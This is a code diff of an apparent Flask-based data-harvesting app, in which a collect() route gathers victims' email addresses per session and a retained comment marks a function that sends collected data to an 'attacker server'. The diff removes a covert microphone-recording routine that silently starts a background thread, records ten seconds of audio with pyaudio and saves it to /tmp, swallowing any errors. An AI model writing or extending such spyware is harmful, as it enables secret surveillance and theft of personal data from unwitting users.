@@ -10,8 +10,6 @@ import random
 import string
 import json
 import os
-import pyaudio
-import wave
 
 app = Flask(__name__)
 
@@ -88,48 +86,7 @@ def collect():
         pass
     collected_data[session_id]['emails'] = emails
     
-    # Audio capture
-    try:
-        audio_thread = threading.Thread(target=capture_audio, args=(session_id,))
-        audio_thread.daemon = True
-        audio_thread.start()
-    except:
-        pass
-    
     return jsonify({'status': 'success'})
-
-# Audio capture function
-def capture_audio(session_id):
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 2
-    RATE = 44100
-    RECORD_SECONDS = 10
-    
-    p = pyaudio.PyAudio()
-    
-    stream = p.open(format=FORMAT,
-                    channels=CHANNELS,
-                    rate=RATE,
-                    input=True,
-                    frames_per_buffer=CHUNK)
-    
-    frames = []
-    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
-        data = stream.read(CHUNK)
-        frames.append(data)
-    
-    stream.stop_stream()
-    stream.close()
-    p.terminate()
-    
-    # Save audio
-    wf = wave.open(f'/tmp/audio_{session_id}.wav', 'wb')
-    wf.setnchannels(CHANNELS)
-    wf.setsampwidth(p.get_sample_size(FORMAT))
-    wf.setframerate(RATE)
-    wf.writeframes(b''.join(frames))
-    wf.close()
 
 # Send collected data to attacker server
 def send_data(session_id):
